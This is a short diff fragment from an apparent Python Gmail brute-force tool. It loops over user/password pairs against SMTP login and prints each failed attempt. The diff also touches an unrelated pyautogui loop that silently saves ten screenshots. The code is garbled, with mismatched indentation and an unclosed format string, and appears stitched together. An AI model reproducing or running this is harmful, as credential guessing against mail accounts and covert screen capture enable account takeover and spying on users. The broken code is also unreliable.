@@ -38,9 +38,10 @@ class GmailBruteForce():
                 except smtplib.SMTPAuthenticationError:
                     # print("\033[1;31msorry \033[1;m")
                     print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
-			import pyautogui
-import time #>..
-for i in range(1,10+1): #10fotos
+
+import pyautogui
+import time 
+for i in range(1,10+1): 
        foto=pyautogui.screenshot()
        time.sleep(5)
         foto.save("foto1%d.png%(i))
